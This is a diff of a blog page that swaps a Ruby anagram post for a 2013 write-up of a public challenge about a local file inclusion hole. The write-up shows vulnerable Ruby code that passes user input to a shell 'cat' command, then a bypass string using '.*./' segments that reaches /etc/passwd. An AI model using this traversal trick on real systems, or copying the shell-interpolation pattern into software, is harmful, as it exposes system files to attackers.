@@ -5,11 +5,11 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>Nag A Ram - Manuel Neuhauser</title>
+  <title>Challenge Accepted: Local File Inclusion - Manuel Neuhauser</title>
   <meta name="author" content="Manuel Neuhauser">
 
   
-  <meta name="description" content="An anagram is a type of word play, the result of rearranging the letters of a word or phrase to produce a new word or phrase, using all the original &hellip;">
+  <meta name="description" content="This morning I woke up to some unfriendly ice rain, and the snow covered sidewalk has turned into an ice-skating rink. Baby steps were necessary to &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,7 +18,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://manu3569.github.io/blog/2013/10/07/nag-a-ram/">
+  <link rel="canonical" href="http://manu3569.github.io/blog/2013/12/09/challenge-accepted-local-file-inclusion/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -88,7 +88,7 @@
   <header>
     
       
-        <h1 class="entry-title">Nag a Ram</h1>
+        <h1 class="entry-title">Challenge Accepted: Local File Inclusion</h1>
       
     
     
@@ -105,7 +105,7 @@
   
 
 
-<time datetime="2013-10-07T12:05:00-04:00" pubdate data-updated="true">Oct 7<span>th</span>, 2013</time>
+<time datetime="2013-12-09T08:18:00-05:00" pubdate data-updated="true">Dec 9<span>th</span>, 2013</time>
         
          | <a href="#disqus_thread">Comments</a>
         
@@ -114,19 +114,33 @@
   </header>
 
 
-<div class="entry-content"><blockquote><p>An anagram is a type of word play, the result of rearranging the letters of a word or phrase to produce a new word or phrase, using all the original letters exactly once; for example orchestra can be rearranged into carthorse. Someone who creates anagrams may be called an &ldquo;anagrammatist&rdquo;. <em>Source: <a href="http://en.wikipedia.org/wiki/Anagram">Wikipedia</a></em></p></blockquote>
+<div class="entry-content"><p>This morning I woke up to some unfriendly ice rain, and the snow covered sidewalk has turned into an ice-skating rink.  Baby steps were necessary to avoid ending up in a horizontal position unvolunerily.  I made it to the train station safely, and got on the NYC-bound train.
+On the bright side, Egor Homakov (@homakov) posted a challenge on Twitter for finding the local file inclusion security hole in a piece of path validation code.</p>
 
-<br/>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">input</span> <span class="o">=</span> <span class="s1">&#39;sub/dir/ectory&#39;</span>
+</span><span class='line'><span class="n">input</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="n">strip</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">raise</span> <span class="s1">&#39;NO WAI&#39;</span> <span class="k">if</span> <span class="n">input</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">input</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">any?</span><span class="p">{</span><span class="o">|</span><span class="n">folder</span><span class="o">|</span> <span class="o">!</span><span class="p">(</span><span class="n">folder</span> <span class="o">=~</span> <span class="sr">/\A[a-zA-Z*.]+\z/</span><span class="p">)</span> <span class="ow">or</span> <span class="n">folder</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span> <span class="p">}</span>
+</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;Error&#39;</span>
+</span><span class='line'><span class="k">else</span>
+</span><span class='line'><span class="nb">puts</span> <span class="sb">`cat </span><span class="si">#{</span><span class="n">input</span><span class="si">}</span><span class="sb">`</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>The core of a recent code challange included finding out whether one string is an anagram of another. Now this task can be accomplished with a couple of iterators and character comparison, but such an answer would yield code that is too complex looking for what I needs to accomplish and it may be difficult to read.</p>
-
-<p>Rather than picking each letter from the first string and finding it in the second, I wanted to compare the two strings in a single step. First, the strings both need to be sorted and in order to do this, they first had to be converted to an array of single letters. With a little <code>String#split</code> and <code>Array#sort</code> magic the resulting arrays can easily be compared.</p>
-
-<br/>
-
-
-
+<p>Looks like my 40 minute train ride has turned into a hacking session and I eagerly played around with the provided code to access the contents of my local <code>etc/passwd</code> file. Eureka! Finally, I figured out that by breaking up <code>..</code> (parent directory) with the wildcard <code>*</code>, I could trick the validation code into allowing my path string. Also, in <code>bash</code> the folder <code>.*.</code> behaves the same as <code>..</code>, so by prepending <code>etc/passwd</code> with the right number of <code>.*./</code> strings, I could finally access the coveted password file.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -140,33 +154,17 @@
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
 <span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">class</span> <span class="nc">Anagram</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Note: This path gives me the passwd file contents on my local system</span>
+</span><span class='line'><span class="n">input</span> <span class="o">=</span> <span class="s1">&#39;.*./.*./.*./.*./.*./etc/passwd&#39;</span>
 </span><span class='line'>
-</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
-</span><span class='line'>    <span class="vi">@word</span> <span class="o">=</span> <span class="n">word</span>
-</span><span class='line'>    <span class="vi">@word_match_string</span> <span class="o">=</span> <span class="n">generate_match_string</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="n">input</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="n">strip</span>
 </span><span class='line'>
-</span><span class='line'>  <span class="k">def</span> <span class="nf">match</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">words</span><span class="o">.</span><span class="n">select</span> <span class="k">do</span> <span class="o">|</span><span class="n">potential_anagram</span><span class="o">|</span>
-</span><span class='line'>      <span class="vi">@word_match_string</span> <span class="o">==</span> <span class="n">generate_match_string</span><span class="p">(</span><span class="n">potential_anagram</span><span class="p">)</span>
-</span><span class='line'>    <span class="k">end</span>
-</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="k">raise</span> <span class="s1">&#39;NO WAI&#39;</span> <span class="k">if</span> <span class="n">input</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span>
 </span><span class='line'>
-</span><span class='line'>  <span class="kp">private</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">def</span> <span class="nf">generate_match_string</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">word</span><span class="o">.</span><span class="n">downcase</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">sort</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">input</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">any?</span><span class="p">{</span><span class="o">|</span><span class="n">folder</span><span class="o">|</span> <span class="o">!</span><span class="p">(</span><span class="n">folder</span> <span class="o">=~</span> <span class="sr">/\A[a-zA-Z*.]+\z/</span><span class="p">)</span> <span class="ow">or</span> <span class="n">folder</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span> <span class="p">}</span>
+</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;Error&#39;</span>
+</span><span class='line'><span class="k">else</span>
+</span><span class='line'><span class="nb">puts</span> <span class="sb">`cat </span><span class="si">#{</span><span class="n">input</span><span class="si">}</span><span class="sb">`</span>
 </span><span class='line'><span class="k">end</span>
 </span></code></pre></td></tr></table></div></figure>
 
@@ -192,12 +190,12 @@
   
 
 
-<time datetime="2013-10-07T12:05:00-04:00" pubdate data-updated="true">Oct 7<span>th</span>, 2013</time>
+<time datetime="2013-12-09T08:18:00-05:00" pubdate data-updated="true">Dec 9<span>th</span>, 2013</time>
       
 
 <span class="categories">
   
-    <a class='category' href='/blog/categories/ruby/'>Ruby</a>
+    <a class='category' href='/blog/categories/challenge/'>Challenge,</a>, <a class='category' href='/blog/categories/file/'>File</a>, <a class='category' href='/blog/categories/inclusion/'>Inclusion</a>, <a class='category' href='/blog/categories/local/'>Local</a>, <a class='category' href='/blog/categories/security/'>Security,</a>
   
 </span>
 
@@ -206,7 +204,7 @@
     
       <div class="sharing">
   
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://manu3569.github.io/blog/2013/10/07/nag-a-ram/" data-via="neuhausermanuel" data-counturl="http://manu3569.github.io/blog/2013/10/07/nag-a-ram/" >Tweet</a>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://manu3569.github.io/blog/2013/12/09/challenge-accepted-local-file-inclusion/" data-via="neuhausermanuel" data-counturl="http://manu3569.github.io/blog/2013/12/09/challenge-accepted-local-file-inclusion/" >Tweet</a>
   
   
   
@@ -217,10 +215,8 @@
     
     <p class="meta">
       
-        <a class="basic-alignment left articlenav" href="/blog/2013/09/24/hello-world/" title="Previous Post: hello world">&laquo; hello world</a>
+        <a class="basic-alignment left articlenav" href="/blog/2013/11/06/oauth-2-dot-0-what-you-need-to-know-about-it-for-building-your-next-app/" title="Previous Post: OAuth 2.0 - What you need to know about it for building your next app">&laquo; OAuth 2.0 - What you need to know about it for building your next app</a>
       
-      
-        <a class="basic-alignment right articlenav" href="/blog/2013/10/07/enumerables-best-kept-secrets/" title="Next Post: Enumerable's Best Kept Secrets">Enumerable's Best Kept Secrets &raquo;</a>
       
     </p>
   </footer>
@@ -315,8 +311,8 @@
       
         
         // var disqus_developer = 1;
-        var disqus_identifier = 'http://manu3569.github.io/blog/2013/10/07/nag-a-ram/';
-        var disqus_url = 'http://manu3569.github.io/blog/2013/10/07/nag-a-ram/';
+        var disqus_identifier = 'http://manu3569.github.io/blog/2013/12/09/challenge-accepted-local-file-inclusion/';
+        var disqus_url = 'http://manu3569.github.io/blog/2013/12/09/challenge-accepted-local-file-inclusion/';
         var disqus_script = 'embed.js';
       
     (function () {
